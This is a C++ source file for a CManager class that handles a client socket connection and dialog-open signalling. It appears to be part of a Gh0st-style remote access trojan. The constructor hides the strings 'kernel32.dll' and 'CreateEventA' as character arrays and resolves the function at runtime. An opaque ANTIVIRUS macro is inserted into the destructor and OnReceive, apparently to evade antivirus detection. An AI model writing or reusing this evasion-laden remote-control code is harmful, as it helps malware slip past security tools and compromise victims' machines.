// Manager.cpp: implementation of the CManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Manager.h"
#include "until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef HANDLE (WINAPI *CreateEventAT)
(
    __in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
    __in     BOOL bManualReset,
    __in     BOOL bInitialState,
    __in_opt LPCSTR lpName
    );

CManager::CManager(CClientSocket *pClient)
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyCreateEventA[]={'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
    CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateEventA);
	m_pClient = pClient;
	m_pClient->setManagerCallBack(this);

	/*
	bManualReset 
	[in] Specifies whether a manual-reset or auto-reset event object is created. If TRUE, then you must use the ResetEvent function to manually reset the state to nonsignaled. If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released. 
	*/
	// 第二个参数为true,禁止系统自动重置事件
	m_hEventDlgOpen = pCreateEventA(NULL, true, false, NULL);
}

CManager::~CManager()
{
	CloseHandle(m_hEventDlgOpen);
    ANTIVIRUS
}
void CManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    ANTIVIRUS	
}


void CManager::WaitForDialogOpen()
{
	WaitForSingleObject(m_hEventDlgOpen, INFINITE);
	// 必须的Sleep,因为远程窗口从InitDialog中发送COMMAND_NEXT到显示还要一段时间
	Sleep(130);
}

int CManager::Send(LPBYTE lpData, UINT nSize)
{
	int	nRet = 0;
	try
	{
		nRet = m_pClient->Send((LPBYTE)lpData, nSize);
	}catch(...){};
	return nRet;
}

void CManager::NotifyDialogIsOpen()
{
	SetEvent(m_hEventDlgOpen);
}